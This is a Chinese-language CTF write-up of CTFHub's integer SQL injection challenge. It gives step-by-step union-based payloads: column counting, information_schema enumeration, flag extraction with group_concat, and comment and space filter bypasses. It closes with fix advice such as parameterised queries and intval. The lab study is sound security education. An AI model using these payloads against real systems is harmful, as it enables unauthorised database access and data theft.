SQL 整数型注入

WEB | CTFHub

题目描述

页面只有一个 ID 查询框，提交后回显 ID 与 Data 两栏，并且直接把后端执行的 SQL 语句打印在页面上。目标是通过 id 参数注入，拿到数据库里的 flag。

考点

  • 整数型 SQL 注入（无需引号闭合）
  • 列数判断与 UNION 联合查询回显
  • information_schema 元数据查询（库 → 表 → 字段）

漏洞分析

输入任意内容后，页面会把自己的 SQL 语句原样打出来：

select * from news where id=$id

$id 直接取自 GET 参数并拼进语句，没有任何过滤，也没有参数化。因为 id 在数据库里是整型，闭合引号这一步都可以省掉，直接把逻辑运算或 union 接在数字后面即可——这就是整数型和字符型注入的唯一区别。

另一个有利条件是：页面把查询结果的第一行拆成 ID、Data 两列输出，等于白送两个回显位，union select 的结果能被直接看到，不需要盲注。

解题过程

1. 判断注入类型

1 and 1=1
1 and 1=2

第一条正常回显 ID: 1 / Data: ctfhub，第二条回显直接消失。and 被当成 SQL 逻辑运算执行了，说明注入点成立；而且不需要 ' 闭合，属于整数型注入。

2. 判断字段数

1 order by 2
1 order by 3

order by 2 正常，order by 3 无回显（报错被隐去）。所以查询结果共 2 列，与页面的 ID / Data 两栏正好对上。

3. 定位回显位

-1 union select 1,2

回显 ID: 1 / Data: 2，两个位置都能用。这里用 -1 是为了让左半边查不到记录，否则原记录会占住第一行，union 的结果被挤到第二行，而页面只显示第一行。

4. 查当前库名

-1 union select 1,database()

回显 sqli。

5. 查表名

-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()

回显 flag,news，目标表是 flag。

6. 查字段名

-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'

回显 flag，字段名也叫 flag。

7. 取数据

-1 union select 1,group_concat(flag) from flag

Data 栏直接吐出 flag。

总结踩坑

  • 必须用 -1（或 0）把原记录顶掉，否则页面只显示第一行，union 结果根本看不到。
  • union select 的列数必须严格等于 2，多一列少一列都会报 The used SELECT statements have a different number of columns。
  • group_concat 可以一次取全；被过滤时退化成 limit 0,1、limit 1,1 逐条取。
  • 空格被过滤可以用 /**/ 代替，例如 -1/**/union/**/select/**/1,2；注释用 --+ 或 %23。
  • 沙箱地址每次申请都会变，写 writeup 时记得同步更新。

修复建议

  • 使用预编译（参数化查询），不要把参数拼进 SQL 字符串。
  • 对数字型参数强制类型转换，例如 PHP 里 $id = intval($_GET['id']);。
  • 数据库账号最小权限，业务库不要用 root 连接。
  • 生产环境关闭详细报错回显，统一返回错误页。
